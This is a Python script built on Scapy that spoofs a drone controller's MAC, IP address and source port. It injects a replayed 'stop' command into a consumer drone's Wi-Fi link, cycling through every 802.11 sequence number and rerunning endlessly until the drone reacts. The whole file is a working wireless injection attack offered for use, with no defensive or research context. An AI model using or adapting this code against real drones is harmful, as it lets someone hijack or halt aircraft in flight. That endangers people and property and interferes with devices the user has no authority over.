import binascii
import time
from scapy.all import sendp, Dot11, RadioTap, IP, UDP, conf

# IMPORTANT: Run this script with sudo/root privileges on a Linux system
# with the Wi-Fi card in monitor mode (e.g., using 'airmon-ng start wlan0')

# --- CONFIGURATION (VERIFY THESE) ---
MONITOR_INTERFACE = "wlan0mon" 

CONTROLLER_MAC = "CA:A9:96:5B:50:05" 
DRONE_MAC      = "C4:D7:FD:0E:F3:6D" 

CONTROLLER_IP = "192.168.169.2"
DRONE_IP      = "192.168.169.1"
DRONE_PORT    = 8800
LEGIT_SOURCE_PORT = 40617 

# *** CRITICAL: PASTE YOUR LONGEST, WORKING HEX PAYLOAD HERE ***
STOP_HEX = (
    "ef0258000202000100000000d7000000140066148080808002020000000000000000000000990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000"
)
# Ensure you replace the dummy hex above with your correct, long payload.
STOP_RAW_BYTES = binascii.unhexlify(STOP_HEX)
# -------------------------------------------


def inject_stop_command_cycling(interface):
    print(f"Targeting: {DRONE_MAC} ({DRONE_IP}:{DRONE_PORT})")
    print(f"Cycling Seq. Numbers for {CONTROLLER_MAC}...")
    print("-" * 50)
    
    # 1. Build the Static Payload (IP/UDP/Data)
    # This remains constant during the loop
    udp_payload = IP(src=CONTROLLER_IP, dst=DRONE_IP) / \
                  UDP(sport=LEGIT_SOURCE_PORT, dport=DRONE_PORT) / \
                  STOP_RAW_BYTES

    # 2. Injection Loop: Cycle through all 4096 possible sequence numbers
    # SC field is 16 bits: 4 for fragment (0) and 12 for sequence number (0-4095)
    
    try:
        # Loop up to the max sequence number (4095)
        for seq_num in range(4096): 
            # Sequence Control (SC) is calculated as: (seq_num << 4) | frag_num 
            # Since frag_num is 0, we just shift the sequence number.
            sequence_control_value = seq_num << 4 
            
            # 3. Build the 802.11 Frame (Layer 2)
            dot11_frame = Dot11(
                addr1=DRONE_MAC, 
                addr2=CONTROLLER_MAC, 
                addr3=DRONE_MAC,
                type=2, 
                subtype=8,  # QoS Data
                SC=sequence_control_value # Explicitly setting the Sequence Control
            )
            
            # 4. Assemble and Send the Packet
            injection_packet = RadioTap() / dot11_frame / udp_payload
            sendp(injection_packet, iface=interface, verbose=False)
            
            if seq_num % 100 == 0:
                # Print status every 100 packets
                print(f"Injected {seq_num + 1} packets. Sequence Number: {seq_num}")
            
            # Send at a rapid rate (10ms delay)
            time.sleep(0.01) 
            
        print("\nCompleted a full cycle (4096 packets). Rerunning cycle...")
        # Recursively call itself to keep cycling until the drone is affected
        inject_stop_command_cycling(interface)
            
    except Exception as e:
        print(f"\nFATAL INJECTION ERROR.")
        print(f"Details: {type(e).__name__}: {e}")

if __name__ == "__main__":
    inject_stop_command_cycling(MONITOR_INTERFACE)
